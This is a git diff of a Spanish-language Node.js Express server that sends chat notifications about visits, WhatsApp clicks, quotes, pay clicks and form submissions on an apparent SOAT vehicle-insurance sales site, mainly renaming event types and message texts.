@@ -16,23 +16,19 @@ app.post('/notificar', async (req, res) => {
 
   let mensaje = "";
 
-  // 🚫 Si no llega tipo, lo tratamos como visita a la página nueva
-  if (!datos.tipo) {
-    mensaje = "👀 *Nuevo visitante en la página NUEVA*";
-
-  // 👀 Visita al sitio (página SOAT)
-  } else if (datos.tipo === "visita") {
-    mensaje = "👀 *Nuevo visitante ingresó al sitio de ventas SOAT*";
+  // 👀 Visita al sitio
+  if (datos.tipo === "visita") {
+    mensaje = "👀 *Nuevo visitante ingresó al sitio*";
 
   // 🖥️ Visita al panel (página nueva)
-  } else if (datos.tipo === "visita_panel") {
-    mensaje = "🖥️ *Nuevo acceso al panel de administración (página nueva)*";
+  } else if (datos.tipo === "visita_panel_nueva") {
+    mensaje = "🖥️ *Nuevo visitante en la página NUEVA*";
 
   // 📲 Clic en WhatsApp (página nueva)
-  } else if (datos.tipo === "whatsapp") {
-    mensaje = "📲 *Un usuario hizo clic en el botón de WhatsApp (página nueva)*";
+  } else if (datos.tipo === "whatsapp_nueva") {
+    mensaje = "📲 *Usuario hizo clic en WhatsApp (página NUEVA)*";
 
-  // 📊 Cotización (SOAT)
+  // 📊 Cotización
   } else if (datos.tipo === "cotizacion") {
     mensaje = `
 📊 *Nueva cotización de SOAT:*
@@ -43,17 +39,17 @@ app.post('/notificar', async (req, res) => {
 💰 *Valor estimado:* ${datos.valor || '$0'}
 `.trim();
 
-  // 🟡 Clic en Pagar (SOAT)
+  // 🟡 Clic en Pagar
   } else if (datos.tipo === "pago") {
     mensaje = `
-🟡 *Clic en Pagar (SOAT)*
+🟡 *Clic en Pagar*
 📧 *Correo:* ${datos.correo || 'N/A'}
 🚗 *Placa:* ${datos.placa || 'N/A'}
 💵 *Valor:* ${datos.valor || '$0'}
 `.trim();
 
-  // 📥 Envío de formulario completo (SOAT)
-  } else if (datos.tipo === "solicitud") {
+  // 📥 Envío de formulario completo
+  } else {
     mensaje = `
 📥 *Nueva solicitud de SOAT*:
 🚗 *Placa:* ${datos.placa || 'No proporcionada'}
@@ -76,10 +72,6 @@ app.post('/notificar', async (req, res) => {
 📌 *Subtipo:* ${datos.subtipo || 'N/A'}
 🎂 *Edad vehículo:* ${datos.edad || 'N/A'}
 `.trim();
-
-  // 🚫 Cualquier otro tipo desconocido
-  } else {
-    mensaje = `ℹ️ *Notificación recibida con tipo desconocido:* ${datos.tipo}`;
   }
 
   try {
@@ -98,13 +90,15 @@ app.post('/notificar', async (req, res) => {
 
 // Ruta de prueba para verificar si el servidor está corriendo
 app.get('/', (req, res) => {
-  res.send('🟢 Servidor de notificación funcionando');
+  res.send('🟢 Servidor de notificación SOAT funcionando');
 });
 
 const PORT = process.env.PORT || 3000;
 app.listen(PORT, () => {
   console.log(`🚀 Servidor corriendo en el puerto ${PORT}`);
 });
+
+
 
 
 
